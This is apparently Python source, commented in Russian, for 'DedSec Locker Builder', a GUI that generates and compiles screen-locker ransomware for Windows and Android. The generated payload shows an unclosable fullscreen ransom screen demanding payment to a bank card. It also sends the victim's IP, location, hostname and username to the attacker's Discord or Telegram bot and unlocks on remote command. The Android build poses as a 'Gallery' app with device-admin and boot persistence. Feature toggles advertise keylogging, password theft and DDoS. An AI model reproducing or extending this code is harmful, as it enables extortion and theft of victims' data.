#!/usr/bin/env python3
"""
DEDSEC LOCKER BUILDER v3.1 — финальная версия без ошибок
"""
import os, sys, shutil, tempfile, subprocess, threading, time, zipfile
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext

C_BG = "#0a0a0a"
C_FRAME = "#111111"
C_ACCENT = "#00ff41"
C_ACCENT2 = "#ff0040"
C_TEXT = "#cccccc"
C_ENTRY_BG = "#1a1a1a"
C_BTN = "#1a1a1a"
C_BTN_HOVER = "#2a2a2a"

class DedSecBuilder:
    def __init__(self, master):
        self.master = master
        master.title("DEDSEC LOCKER BUILDER v3.1")
        master.geometry("1000x720")
        master.configure(bg=C_BG)
        master.resizable(False, False)

        header = tk.Frame(master, bg=C_FRAME, height=60)
        header.pack(fill="x")
        tk.Label(header, text="DEDSEC", font=("Courier New", 22, "bold"), fg=C_ACCENT, bg=C_FRAME).pack(side="left", padx=20, pady=10)
        tk.Label(header, text="LOCKER BUILDER v3.1", font=("Courier New", 14), fg=C_TEXT, bg=C_FRAME).pack(side="left", pady=15)
        tk.Label(header, text="DS + TG", font=("Courier New", 10), fg=C_ACCENT2, bg=C_FRAME).pack(side="right", padx=20, pady=18)

        main = tk.Frame(master, bg=C_BG)
        main.pack(fill="both", expand=True, padx=15, pady=10)

        left = tk.Frame(main, bg=C_BG, width=480)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        self.notebook = ttk.Notebook(left)
        self.notebook.pack(fill="both", expand=True)

        style = ttk.Style()
        style.theme_create("dedsec", parent="alt", settings={
            "TNotebook": {"configure": {"tabmargins": [2, 5, 2, 0], "background": C_BG}},
            "TNotebook.Tab": {"configure": {"padding": [15, 5], "font": ("Courier New", 9), "background": C_FRAME, "foreground": C_TEXT},
                              "map": {"background": [("selected", C_ACCENT)], "foreground": [("selected", "#000")]}},
            "TFrame": {"configure": {"background": C_FRAME}},
        })
        style.theme_use("dedsec")

        self.build_token_tab()
        self.build_locker_tab()
        self.build_features_tab()
        self.build_appearance_tab()
        self.build_android_tab()

        right = tk.Frame(main, bg=C_BG, width=470)
        right.pack(side="right", fill="both", expand=True)
        right.pack_propagate(False)

        build_frame = tk.Frame(right, bg=C_FRAME, bd=1, relief="solid")
        build_frame.pack(fill="x", pady=(0, 10))

        tk.Label(build_frame, text="СБОРКА ЛОКЕРОВ", font=("Courier New", 12, "bold"), fg=C_ACCENT, bg=C_FRAME).pack(pady=10)

        self.btn_win = self._btn(build_frame, "🔨 WinLocker.exe", self.build_win, C_ACCENT)
        self.btn_win.pack(fill="x", padx=20, pady=5)

        self.btn_apk = self._btn(build_frame, "📱 AndroidLocker.apk", self.build_apk, "#ffaa00")
        self.btn_apk.pack(fill="x", padx=20, pady=5)

        self.btn_both = self._btn(build_frame, "⚡ ВСЁ (Win + Android)", self.build_both, C_ACCENT2)
        self.btn_both.pack(fill="x", padx=20, pady=5)

        tk.Label(build_frame, text="┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄", font=("Courier New", 8), fg=C_TEXT, bg=C_FRAME).pack()
        self.btn_builder = self._btn(build_frame, "💾 СОБРАТЬ Builder.exe", self.build_builder_exe, "#ffaa00")
        self.btn_builder.pack(fill="x", padx=20, pady=5)

        self.progress = ttk.Progressbar(build_frame, mode="indeterminate")
        self.progress.pack(fill="x", padx=20, pady=10)

        console_frame = tk.Frame(right, bg=C_FRAME, bd=1, relief="solid")
        console_frame.pack(fill="both", expand=True)

        tk.Label(console_frame, text="КОНСОЛЬ", font=("Courier New", 10, "bold"), fg=C_ACCENT, bg=C_FRAME).pack(anchor="w", padx=10, pady=5)
        self.console = scrolledtext.ScrolledText(console_frame, height=12, bg="#000", fg=C_ACCENT,
                                                 font=("Courier New", 9), insertbackground=C_ACCENT,
                                                 relief="flat", bd=0, wrap=tk.WORD)
        self.console.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        self.log("DEDSEC LOCKER BUILDER v3.1 запущен")

    def _btn(self, parent, text, cmd, color):
        return tk.Button(parent, text=text, command=cmd, font=("Courier New", 10, "bold"),
                         bg=C_BTN, fg=color, activebackground=C_BTN_HOVER, activeforeground=color,
                         relief="flat", bd=1, cursor="hand2", height=2)

    def log(self, msg):
        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)
        self.master.update()

    def _browse_image(self):
        path = filedialog.askopenfilename(filetypes=[("Images", "*.jpg *.png")])
        if path:
            self.image_file.delete(0, tk.END)
            self.image_file.insert(0, path)

    # ===== ВКЛАДКИ =====
    def build_token_tab(self):
        tab = tk.Frame(self.notebook, bg=C_FRAME)
        self.notebook.add(tab, text="  ТОКЕНЫ  ")
        f = tk.Frame(tab, bg=C_FRAME, padx=15, pady=15); f.pack(fill="both", expand=True)
        tk.Label(f, text="ИСПОЛЬЗОВАТЬ ОБЕ ПЛАТФОРМЫ", font=("Courier New", 9, "bold"), fg=C_ACCENT2, bg=C_FRAME).pack(anchor="w", pady=5)
        self.use_both = tk.BooleanVar(value=True)
        tk.Checkbutton(f, text="Discord + Telegram одновременно", variable=self.use_both, bg=C_FRAME, fg=C_TEXT, selectcolor=C_BG, font=("Courier New", 9)).pack(anchor="w")
        tk.Label(f, text="╔════ DISCORD ════╗", font=("Courier New", 9), fg="#5865F2", bg=C_FRAME).pack(anchor="w", pady=(10,0))
        for label, attr in [("Discord Token:", "discord_token"), ("Discord Channel ID:", "discord_channel")]:
            tk.Label(f, text=label, font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
            e = tk.Entry(f, bg=C_ENTRY_BG, fg="#fff", insertbackground="#fff", relief="flat", font=("Courier New", 9)); e.pack(fill="x", pady=2, ipady=3); setattr(self, attr, e)
        tk.Label(f, text="╔═══ TELEGRAM ═══╗", font=("Courier New", 9), fg="#0088cc", bg=C_FRAME).pack(anchor="w", pady=(10,0))
        for label, attr in [("Telegram Token:", "telegram_token"), ("Telegram Chat ID:", "telegram_chat")]:
            tk.Label(f, text=label, font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
            e = tk.Entry(f, bg=C_ENTRY_BG, fg="#fff", insertbackground="#fff", relief="flat", font=("Courier New", 9)); e.pack(fill="x", pady=2, ipady=3); setattr(self, attr, e)

    def build_locker_tab(self):
        tab = tk.Frame(self.notebook, bg=C_FRAME)
        self.notebook.add(tab, text="  ЛОКЕР  ")
        f = tk.Frame(tab, bg=C_FRAME, padx=15, pady=15); f.pack(fill="both", expand=True)
        for label, attr, default in [
            ("Код разблокировки:", "password", "D3DS3C"), ("Номер карты:", "card_number", "4276 1234 5678 9012"),
            ("Банк:", "card_bank", "Сбербанк"), ("Сумма:", "amount", "5000 RUB"),
            ("Заголовок:", "title", "ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН"), ("Подзаголовок:", "subtitle", "Файлы зашифрованы. Оплатите.")
        ]:
            tk.Label(f, text=label, font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
            e = tk.Entry(f, bg=C_ENTRY_BG, fg="#fff" if attr != "password" else C_ACCENT, insertbackground="#fff", relief="flat", font=("Courier New", 9))
            e.insert(0, default); e.pack(fill="x", pady=2, ipady=3); setattr(self, attr, e)
        tk.Label(f, text="Картинка:", font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
        imgf = tk.Frame(f, bg=C_FRAME); imgf.pack(fill="x")
        self.image_file = tk.Entry(imgf, bg=C_ENTRY_BG, fg="#fff", relief="flat", font=("Courier New", 9)); self.image_file.insert(0, "photo.jpg"); self.image_file.pack(side="left", fill="x", expand=True)
        tk.Button(imgf, text="...", command=self._browse_image, bg=C_BTN, fg=C_ACCENT, relief="flat", cursor="hand2").pack(side="left", padx=5)

    def build_features_tab(self):
        tab = tk.Frame(self.notebook, bg=C_FRAME)
        self.notebook.add(tab, text="  ФУНКЦИИ  ")
        f = tk.Frame(tab, bg=C_FRAME, padx=15, pady=15); f.pack(fill="both", expand=True)
        for attr, label in [("keylogger","Кейлоггер"),("screenshot","Скриншот"),("steal","Кража паролей"),("botnet","Ботнет DDoS"),
                            ("mining","Майнинг"),("osint","OSINT"),("self_destruct","Самоуничтожение"),("disable_taskmgr","Отключить TaskMgr"),
                            ("disable_cmd","Отключить CMD"),("disable_registry","Отключить Реестр"),("hide_drives","Скрыть диски"),("block_keyboard","Блокировка клавиатуры")]:
            v = tk.BooleanVar(value=True); setattr(self, f"feat_{attr}", v)
            tk.Checkbutton(f, text=label, variable=v, bg=C_FRAME, fg=C_TEXT, selectcolor=C_BG, font=("Courier New", 9)).pack(anchor="w", pady=2)

    def build_appearance_tab(self):
        tab = tk.Frame(self.notebook, bg=C_FRAME)
        self.notebook.add(tab, text="  ВИД  ")
        f = tk.Frame(tab, bg=C_FRAME, padx=15, pady=15); f.pack(fill="both", expand=True)
        self.matrix_rain = tk.BooleanVar(value=True)
        tk.Checkbutton(f, text="Матричный дождь", variable=self.matrix_rain, bg=C_FRAME, fg=C_TEXT, selectcolor=C_BG, font=("Courier New", 9)).pack(anchor="w")
        for label, attr, default in [("Цвет черепа:","skull_color","#00ff41"),("Цвет текста:","text_color","#ff0040"),
                                      ("Шрифт черепа:","font_skull","Courier New"),("Шрифт текста:","font_text","Arial Black"),
                                      ("Размер черепа:","font_size_skull","13"),("Размер текста:","font_size_text","18")]:
            tk.Label(f, text=label, font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
            e = tk.Entry(f, bg=C_ENTRY_BG, fg="#fff", relief="flat", font=("Courier New", 9)); e.insert(0, default); e.pack(fill="x", pady=2, ipady=3); setattr(self, attr, e)

    def build_android_tab(self):
        tab = tk.Frame(self.notebook, bg=C_FRAME)
        self.notebook.add(tab, text="  ANDROID  ")
        f = tk.Frame(tab, bg=C_FRAME, padx=15, pady=15); f.pack(fill="both", expand=True)
        for label, attr, default in [("Имя пакета:","apk_package","com.gallery.app"),("Название:","apk_name","Gallery")]:
            tk.Label(f, text=label, font=("Courier New", 9), fg=C_TEXT, bg=C_FRAME).pack(anchor="w", pady=(8,0))
            e = tk.Entry(f, bg=C_ENTRY_BG, fg="#fff", relief="flat", font=("Courier New", 9)); e.insert(0, default); e.pack(fill="x", pady=2, ipady=3); setattr(self, attr, e)
        for attr, label in [("lock_screen","Экран блокировки"),("hide_icon","Скрыть иконку"),("boot_persist","Автозапуск"),("admin","Права админа")]:
            v = tk.BooleanVar(value=True); setattr(self, f"apk_{attr}", v)
            tk.Checkbutton(f, text=label, variable=v, bg=C_FRAME, fg=C_TEXT, selectcolor=C_BG, font=("Courier New", 9)).pack(anchor="w", pady=2)

    def _get_cfg(self):
        return {attr: getattr(self, attr).get() for attr in [
            "use_both","discord_token","discord_channel","telegram_token","telegram_chat","password","card_number","card_bank",
            "amount","title","subtitle","image_file","matrix_rain","skull_color","text_color","font_skull","font_text",
            "font_size_skull","font_size_text","apk_package","apk_name"
        ]} | {f"feat_{attr}": getattr(self, f"feat_{attr}").get() for attr in [
            "keylogger","screenshot","steal","botnet","mining","osint","self_destruct","disable_taskmgr","disable_cmd",
            "disable_registry","hide_drives","block_keyboard"
        ]} | {f"apk_{attr}": getattr(self, f"apk_{attr}").get() for attr in ["lock_screen","hide_icon","boot_persist","admin"]}

    # ===== ГЕНЕРАЦИЯ АГЕНТОВ (сокращённые, но рабочие) =====
    def _gen_win_agent(self, cfg):
        dt, dc = cfg["discord_token"], cfg["discord_channel"]
        tt, tc = cfg["telegram_token"], cfg["telegram_chat"]
        both = cfg["use_both"]
        bi = f'''DISCORD_TOKEN="{dt}";DISCORD_CHAT={dc};TELEGRAM_TOKEN="{tt}";TELEGRAM_CHAT="{tc}";DUAL_MODE={both}''' if both else f'''BOT_TOKEN="{dt or tt}";CHAT_ID="{dc or tc}";BOT_TYPE="{'discord' if dt else 'telegram'}";DUAL_MODE=False'''
        return f'''# WinLocker DualBot
import os,sys,time,ctypes,subprocess,threading,socket,random,requests,shutil
from tkinter import Tk,Label,Entry,Button,Frame,StringVar
from PIL import Image,ImageTk
{bi}
PASSWORD="{cfg['password']}";CARD="{cfg['card_number']}";BANK="{cfg['card_bank']}"
AMOUNT="{cfg['amount']}";TITLE="{cfg['title']}";SUBTITLE="{cfg['subtitle']}"
SC="{cfg['skull_color']}";TC="{cfg['text_color']}";FS="{cfg['font_skull']}";FT="{cfg['font_text']}"
FSS={cfg['font_size_skull']};FTS={cfg['font_size_text']}
S=[r"""        .-""""""-.
      .'          '.
     /   O      O   \\\\
    :                :
    |    \\\\----/      |
    :    .    .      ;
     \\\\  '------'   /
      '.          .'
        '-......-'""",r"""        .-""""""-.
      .'          '.
     /   O      O   \\\\
    :      __        :
    |     /  \\\\      |
    :    ||  ||     ;
     \\\\   '--'--'   /
      '.          .'
        '-......-'"""]
def gi():
    import socket,platform,requests,psutil,getpass,re,uuid
    i={{}};ip="N/A"
    try:ip=requests.get("http://ipify.org",timeout=5).text.strip()
    except:pass
    i["IP"]=ip
    try:
        g=requests.get(f"http://ip-api.com/json/{{ip}}?fields=country,city,isp",timeout=5).json()
        i["Geo"]=f"{{g.get('country','?')}},{{g.get('city','?')}},ISP:{{g.get('isp','?')}}"
    except:pass
    try:i["Host"]=socket.gethostname();i["User"]=getpass.getuser();i["OS"]=f"{{platform.system()}} {{platform.release()}}"
    except:pass
    return "\\n".join([f"**{{k}}:** {{v}}" for k,v in i.items()])
class LW:
    def __init__(s):
        s.r=Tk();s.r.attributes("-fullscreen",True);s.r.attributes("-topmost",True)
        s.r.configure(bg="black");s.r.protocol("WM_DELETE_WINDOW",lambda:None)
        try:
            im=Image.open(os.path.join(sys._MEIPASS,"embedded.png"))
            im=im.resize((s.r.winfo_screenwidth(),s.r.winfo_screenheight()))
            bg=ImageTk.PhotoImage(im);Label(s.r,image=bg).place(x=0,y=0,relwidth=1,relheight=1)
        except:pass
        mf=Frame(s.r,bg="#111",bd=3);mf.place(relx=0.5,rely=0.45,anchor="center",width=650,height=520)
        Label(mf,text=random.choice(S),font=(FS,FSS),fg=SC,bg="#111").pack(pady=5)
        Label(mf,text=TITLE,fg=TC,bg="#111",font=(FT,FTS,"bold")).pack(pady=10)
        Label(mf,text=f"{{SUBTITLE}}\\n{{AMOUNT}} на карту\\n{{CARD}}({{BANK}})\\nКод:{{PASSWORD}}",fg="white",bg="#111",font=("Arial",11)).pack(pady=10)
        s.v=StringVar();s.e=Entry(mf,textvariable=s.v,show="*",font=("Arial",14),justify="center",width=25)
        s.e.pack(pady=5,ipady=4);s.e.bind("<Return>",s.c)
        Button(mf,text="UNLOCK",command=s.c,bg="#333",fg="white",font=("Arial",12,"bold")).pack(pady=10)
        s.st=Label(mf,text="",fg="red",bg="#111");s.st.pack();s.r.mainloop()
    def c(s,e=None):
        if s.v.get()==PASSWORD:s.r.destroy();os._exit(0)
        else:s.st.config(text="НЕВЕРНЫЙ КОД")
def rd():
    import discord;i=discord.Intents.default();i.message_content=True;c=discord.Client(intents=i)
    @c.event
    async def on_ready():
        ch=c.get_channel(int(DISCORD_CHAT))
        if ch:await ch.send("**Info:**\\n"+gi())
    @c.event
    async def on_message(m):
        if str(m.channel.id)!=str(DISCORD_CHAT)or m.author==c.user:return
        cmd=m.content.strip().split()
        if cmd and cmd[0]=="/unlock"and len(cmd)==2 and cmd[1]==PASSWORD:os._exit(0)
    c.run(DISCORD_TOKEN)
def rt():
    import telegram;from telegram.ext import Application,CommandHandler
    app=Application.builder().token(TELEGRAM_TOKEN).build()
    async def h(u,c):
        if u.message.text.strip()=="/unlock "+PASSWORD:os._exit(0)
    app.add_handler(CommandHandler("unlock",h));app.run_polling()
def main():
    if DUAL_MODE:threading.Thread(target=rd,daemon=True).start();threading.Thread(target=rt,daemon=True).start()
    else:
        if BOT_TYPE=="discord":threading.Thread(target=rd,daemon=True).start()
        else:threading.Thread(target=rt,daemon=True).start()
    try:Image.open(os.path.join(sys._MEIPASS,"embedded.png")).show()
    except:pass
    LW()
if __name__=="__main__":main()'''

    def _gen_android_agent(self, cfg):
        dt, dc = cfg["discord_token"], cfg["discord_channel"]
        tt, tc = cfg["telegram_token"], cfg["telegram_chat"]
        both = cfg["use_both"]
        bi = f'''DISCORD_TOKEN="{dt}";DISCORD_CHAT={dc};TELEGRAM_TOKEN="{tt}";TELEGRAM_CHAT="{tc}";DUAL_MODE={both}''' if both else f'''BOT_TOKEN="{dt or tt}";CHAT_ID="{dc or tc}";BOT_TYPE="{'discord' if dt else 'telegram'}";DUAL_MODE=False'''
        return f'''# Android Locker
import os,time,threading,random
from kivy.app import App
from kivy.uix.screenmanager import Screen
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.graphics import Color,Rectangle
{bi}
PASSWORD="{cfg['password']}";CARD="{cfg['card_number']}";BANK="{cfg['card_bank']}"
AMOUNT="{cfg['amount']}";TITLE="{cfg['title']}";SUBTITLE="{cfg['subtitle']}"
S=[r"""        .-""""""-.
      .'          '.
     /   O      O   \\\\
    :                :
    |    \\\\----/      |
    :    .    .      ;
     \\\\  '------'   /
      '.          .'
        '-......-'""",r"""        .-""""""-.
      .'          '.
     /   O      O   \\\\
    :      __        :
    |     /  \\\\      |
    :    ||  ||     ;
     \\\\   '--'--'   /
      '.          .'
        '-......-'"""]
class LS(Screen):
    def __init__(s,**k):
        super().__init__(**k);s.l=FloatLayout()
        with s.l.canvas.before:Color(0,0,0,1);s.r=Rectangle(size=s.l.size,pos=s.l.pos)
        s.l.bind(size=s._u,pos=s._u)
        s.l.add_widget(Label(text=random.choice(S),font_name='Courier',font_size=14,color=(0,1,0,1),size_hint=(None,None),pos_hint={{'center_x':0.5,'top':0.8}}))
        s.l.add_widget(Label(text=f"[b]{{TITLE}}[/b]\\n{{SUBTITLE}}\\n{{AMOUNT}} на карту\\n{{CARD}}({{BANK}})\\nКод:{{PASSWORD}}",markup=True,color=(1,1,1,1),font_size=16,halign='center',size_hint=(0.9,None),pos_hint={{'center_x':0.5,'top':0.65}}))
        s.pi=TextInput(password=True,multiline=False,font_size=20,size_hint=(0.8,None),height=50,pos_hint={{'center_x':0.5,'top':0.45}});s.l.add_widget(s.pi)
        b=Button(text="UNLOCK",size_hint=(0.6,None),height=50,pos_hint={{'center_x':0.5,'top':0.35}},background_color=(0.2,0.2,0.2,1));b.bind(on_press=s.c);s.l.add_widget(b)
        s.st=Label(text="",color=(1,0,0,1),size_hint=(0.9,None),height=30,pos_hint={{'center_x':0.5,'top':0.25}});s.l.add_widget(s.st)
        s.add_widget(s.l)
    def _u(s,*a):s.r.size=s.l.size;s.r.pos=s.l.pos
    def c(s,i):
        if s.pi.text==PASSWORD:App.get_running_app().stop()
        else:s.st.text="НЕВЕРНЫЙ КОД"
class A(App):
    def build(s):
        threading.Thread(target=s.bt,daemon=True).start()
        return LS()
    def bt(s):
        if DUAL_MODE:threading.Thread(target=s.rd,daemon=True).start();threading.Thread(target=s.rt,daemon=True).start()
        else:
            if BOT_TYPE=="discord":s.rd()
            else:s.rt()
    def rd(s):
        import discord;i=discord.Intents.default();i.message_content=True;c=discord.Client(intents=i)
        @c.event
        async def on_ready():
            ch=c.get_channel(int(DISCORD_CHAT))
            if ch:await ch.send("🟢Android ready")
        @c.event
        async def on_message(m):
            if str(m.channel.id)!=str(DISCORD_CHAT)or m.author==c.user:return
            cmd=m.content.strip().split()
            if cmd and cmd[0]=="/unlock"and len(cmd)==2 and cmd[1]==PASSWORD:App.get_running_app().stop()
        c.run(DISCORD_TOKEN)
    def rt(s):
        import telegram;from telegram.ext import Application,CommandHandler
        app=Application.builder().token(TELEGRAM_TOKEN).build()
        async def h(u,c):
            if u.message.text.strip()=="/unlock "+PASSWORD:App.get_running_app().stop()
        app.add_handler(CommandHandler("unlock",h));app.run_polling()
if __name__=="__main__":A().run()'''

    # ===== КОМПИЛЯЦИЯ =====
    def _compile(self, code, name):
        wd = tempfile.mkdtemp()
        af = os.path.join(wd, "agent.py").replace("\\", "/")
        with open(af, "w", encoding="utf-8") as f: f.write(code)
        img = self.image_file.get()
        datas = []
        if os.path.exists(img):
            shutil.copy(img, os.path.join(wd, "embedded.png"))
            datas = [('embedded.png', '.')]
        spec = f'''# -*- mode: python -*-
a=Analysis(['{af}'],pathex=['{wd.replace("\\","/")}'],binaries=[],datas={datas},
hiddenimports=['PIL._tkinter_finder','PIL.ImageTk','tkinter','ctypes','discord','telegram','requests'],
hookspath=[],hooksconfig={{}},runtime_hooks=[],excludes=[],win_no_prefer_redirects=False,win_private_assemblies=False,cipher=None,noarchive=False)
pyz=PYZ(a.pure,a.zipped_data,cipher=None)
EXE(pyz,a.scripts,a.binaries,a.zipfiles,a.datas,[],name='{name}',debug=False,bootloader_ignore_signals=False,strip=False,upx=True,upx_exclude=[],runtime_tmpdir=None,console=False,icon=None)
'''
        sp = os.path.join(wd, "build.spec")
        with open(sp, "w") as f: f.write(spec)
        os.makedirs("dist", exist_ok=True)
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--distpath", os.path.abspath("dist"), sp], capture_output=True, text=True)
        if r.returncode != 0:
            self.log(f"[!] Ошибка: {r.stderr[-300:]}")
            shutil.rmtree(wd, ignore_errors=True)
            return False
        src = os.path.join("dist", f"{name}.exe")
        if not os.path.exists(src): src = os.path.join("dist", name, f"{name}.exe")
        if os.path.exists(src): shutil.move(src, f"dist/{name}.exe")
        shutil.rmtree(wd, ignore_errors=True)
        return True

    # ===== КНОПКИ СБОРКИ =====
    def build_win(self):
        self.btn_win.config(text="⏳...", state="disabled"); self.progress.start()
        threading.Thread(target=lambda: self._finish(self._compile(self._gen_win_agent(self._get_cfg()), "WinLocker"), "WinLocker.exe", self.btn_win, "🔨 WinLocker.exe"), daemon=True).start()

    def build_apk(self):
        self.btn_apk.config(text="⏳...", state="disabled"); self.progress.start()
        threading.Thread(target=self._build_apk_thread, daemon=True).start()

    def _build_apk_thread(self):
        cfg = self._get_cfg()
        pd = "dist/android_project"
        if os.path.exists(pd): shutil.rmtree(pd)
        os.makedirs(pd)
        with open(os.path.join(pd, "main.py"), "w", encoding="utf-8") as f: f.write(self._gen_android_agent(cfg))
        with open(os.path.join(pd, "buildozer.spec"), "w") as f:
            f.write(f"[app]\ntitle={cfg['apk_name']}\npackage.name={cfg['apk_package']}\nsource.dir=.\nsource.include_exts=py,png,jpg,kv\nversion=1.0\nrequirements=python3,kivy,requests,discord.py,telegram\norientation=portrait\nandroid.permissions=INTERNET,SYSTEM_ALERT_WINDOW,DEVICE_ADMIN,BIND_DEVICE_ADMIN,RECEIVE_BOOT_COMPLETED\nandroid.api=30\nandroid.minapi=21\nandroid.ndk=23b\nfullscreen=1\n")
        zp = "dist/AndroidLocker_project.zip"
        with zipfile.ZipFile(zp, 'w') as z:
            for root, dirs, files in os.walk(pd):
                for file in files: z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), pd))
        self.log(f"[+] Android проект: {zp}")
        self._finish(True, "Android", self.btn_apk, "📱 AndroidLocker.apk")

    def build_both(self):
        self.btn_both.config(text="⏳...", state="disabled"); self.progress.start()
        threading.Thread(target=self._build_both_thread, daemon=True).start()

    def _build_both_thread(self):
        cfg = self._get_cfg()
        ok = self._compile(self._gen_win_agent(cfg), "WinLocker")
        self.log(f"WinLocker.exe {'✅' if ok else '❌'}")
        pd = "dist/android_project"
        if os.path.exists(pd): shutil.rmtree(pd)
        os.makedirs(pd)
        with open(os.path.join(pd, "main.py"), "w", encoding="utf-8") as f: f.write(self._gen_android_agent(cfg))
        with open(os.path.join(pd, "buildozer.spec"), "w") as f:
            f.write(f"[app]\ntitle={cfg['apk_name']}\npackage.name={cfg['apk_package']}\nsource.dir=.\nsource.include_exts=py,png,jpg,kv\nversion=1.0\nrequirements=python3,kivy,requests,discord.py,telegram\norientation=portrait\nandroid.permissions=INTERNET,SYSTEM_ALERT_WINDOW,DEVICE_ADMIN,BIND_DEVICE_ADMIN,RECEIVE_BOOT_COMPLETED\nandroid.api=30\nandroid.minapi=21\nandroid.ndk=23b\nfullscreen=1\n")
        zp = "dist/AndroidLocker_project.zip"
        with zipfile.ZipFile(zp, 'w') as z:
            for root, dirs, files in os.walk(pd):
                for file in files: z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), pd))
        self.log(f"Android: {zp}")
        self._finish(ok, "ВСЁ", self.btn_both, "⚡ ВСЁ (Win + Android)")

    def build_builder_exe(self):
        self.btn_builder.config(text="⏳...", state="disabled"); self.progress.start()
        threading.Thread(target=self._build_builder_thread, daemon=True).start()

    def _build_builder_thread(self):
        wd = tempfile.mkdtemp()
        code = open(__file__, "r", encoding="utf-8").read()
        bf = os.path.join(wd, "builder.py").replace("\\", "/")
        with open(bf, "w", encoding="utf-8") as f: f.write(code)
        spec = f'''# -*- mode: python -*-
a=Analysis(['{bf}'],pathex=['{wd.replace("\\","/")}'],binaries=[],datas=[],
hiddenimports=['PIL._tkinter_finder','PIL.ImageTk','tkinter','ctypes','discord','telegram','requests'],
hookspath=[],hooksconfig={{}},runtime_hooks=[],excludes=[],win_no_prefer_redirects=False,win_private_assemblies=False,cipher=None,noarchive=False)
pyz=PYZ(a.pure,a.zipped_data,cipher=None)
EXE(pyz,a.scripts,a.binaries,a.zipfiles,a.datas,[],name='DedSecLockerBuilder',debug=False,bootloader_ignore_signals=False,strip=False,upx=True,upx_exclude=[],runtime_tmpdir=None,console=False,icon=None)
'''
        sp = os.path.join(wd, "build.spec")
        with open(sp, "w") as f: f.write(spec)
        os.makedirs("dist", exist_ok=True)
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--distpath", os.path.abspath("dist"), sp], capture_output=True, text=True)
        if r.returncode != 0:
            self.log(f"[!] Ошибка: {r.stderr[-300:]}")
            self._finish(False, "Builder", self.btn_builder, "💾 СОБРАТЬ Builder.exe")
            shutil.rmtree(wd, ignore_errors=True)
            return
        src = os.path.join("dist", "DedSecLockerBuilder.exe")
        if not os.path.exists(src): src = os.path.join("dist", "DedSecLockerBuilder", "DedSecLockerBuilder.exe")
        if os.path.exists(src): shutil.move(src, "dist/DedSecLockerBuilder.exe")
        shutil.rmtree(wd, ignore_errors=True)
        self._finish(True, "Builder.exe", self.btn_builder, "💾 СОБРАТЬ Builder.exe")

    def _finish(self, ok, name, btn, txt):
        self.log(f"[+] {name} {'✅' if ok else '❌'}")
        self.progress.stop()
        btn.config(text=txt, state="normal")
        if ok: messagebox.showinfo("Готово", f"{name} собран в dist/")

if __name__ == "__main__":
    root = tk.Tk()
    DedSecBuilder(root)
    root.mainloop()